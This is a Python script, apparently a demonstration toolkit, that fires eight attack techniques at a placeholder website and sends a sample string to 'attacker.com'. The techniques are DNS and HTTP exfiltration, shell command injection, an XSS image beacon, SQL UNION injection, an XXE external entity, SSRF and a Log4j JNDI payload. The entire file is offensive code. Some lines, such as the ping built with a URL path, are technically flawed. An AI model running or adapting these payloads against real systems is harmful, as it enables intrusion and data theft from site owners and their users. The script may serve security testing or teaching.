import requests
import subprocess
import dns.resolver

# Configuration
DEMO_WEBSITE_URL = "http://your-demo-website.com"
ATTACKER_DNS_SERVER = "attacker.com"

def dns_exfiltration(data):
    """Perform DNS exfiltration."""
    # Construct the domain with the data to be exfiltrated
    domain = f"{data}.{ATTACKER_DNS_SERVER}"
    try:
        # Perform a DNS resolution for the constructed domain
        dns.resolver.resolve(domain, 'A')
    except Exception as e:
        print(f"DNS exfiltration error: {e}")

def http_exfiltration(data):
    """Perform HTTP exfiltration."""
    # Construct the URL with the data as a query parameter
    url = f"{DEMO_WEBSITE_URL}/log?data={data}"
    try:
        # Send an HTTP GET request to the constructed URL
        requests.get(url)
    except Exception as e:
        print(f"HTTP exfiltration error: {e}")

def command_injection(data):
    """Perform command injection."""
    try:
        # Construct a command that pings an attacker server with the data
        cmd = f"ping -c 1 {ATTACKER_DNS_SERVER}/{data}"
        # Execute the command using the subprocess module
        subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Command injection error: {e}")

def xss_exfiltration(data):
    """Perform XSS exfiltration."""
    # Construct a script payload that sends data to the attacker server
    payload = f"<script>new Image().src='http://{ATTACKER_DNS_SERVER}/log?data={data}';</script>"
    try:
        # Send the payload to an endpoint that stores and logs user input
        requests.post(f"{DEMO_WEBSITE_URL}/xss", data={"input": payload})
    except Exception as e:
        print(f"XSS exfiltration error: {e}")

def sql_injection(data):
    """Perform SQL injection."""
    # Construct a SQL injection payload
    payload = f"1' UNION SELECT '{data}'--"
    try:
        # Send the payload as a query parameter to an endpoint that executes SQL queries
        requests.get(f"{DEMO_WEBSITE_URL}/search?query={payload}")
    except Exception as e:
        print(f"SQL injection error: {e}")

def xxe_exfiltration(data):
    """Perform XXE exfiltration."""
    # Construct an XML payload with an external entity reference
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{ATTACKER_DNS_SERVER}/{data}">]>
    <foo>&xxe;</foo>"""
    headers = {'Content-Type': 'application/xml'}
    try:
        # Send the payload to an endpoint that parses XML
        requests.post(f"{DEMO_WEBSITE_URL}/xxe", data=payload, headers=headers)
    except Exception as e:
        print(f"XXE exfiltration error: {e}")

def ssrf_exfiltration(data):
    """Perform SSRF exfiltration."""
    # Construct a URL that points to the attacker server with the data
    payload = f"http://{ATTACKER_DNS_SERVER}/log?data={data}"
    try:
        # Send the payload to an endpoint that fetches resources from URLs
        requests.get(f"{DEMO_WEBSITE_URL}/fetch?url={payload}")
    except Exception as e:
        print(f"SSRF exfiltration error: {e}")

def log4j_exfiltration(data):
    """Perform Log4j exfiltration."""
    # Construct a payload that exploits the Log4j JNDI lookup mechanism
    payload = f"${{jndi:ldap://{ATTACKER_DNS_SERVER}/a}}"
    headers = {'User-Agent': payload}
    try:
        # Send the payload in the User-Agent header to the target URL
        requests.get(DEMO_WEBSITE_URL, headers=headers)
    except Exception as e:
        print(f"Log4j exfiltration error: {e}")

def main():
    data_to_exfiltrate = "sensitive_data"

    print("Performing DNS Exfiltration...")
    dns_exfiltration(data_to_exfiltrate)

    print("Performing HTTP Exfiltration...")
    http_exfiltration(data_to_exfiltrate)

    print("Performing Command Injection...")
    command_injection(data_to_exfiltrate)

    print("Performing XSS Exfiltration...")
    xss_exfiltration(data_to_exfiltrate)

    print("Performing SQL Injection...")
    sql_injection(data_to_exfiltrate)

    print("Performing XXE Exfiltration...")
    xxe_exfiltration(data_to_exfiltrate)

    print("Performing SSRF Exfiltration...")
    ssrf_exfiltration(data_to_exfiltrate)

    print("Performing Log4j Exfiltration...")
    log4j_exfiltration(data_to_exfiltrate)

if __name__ == "__main__":
    main()
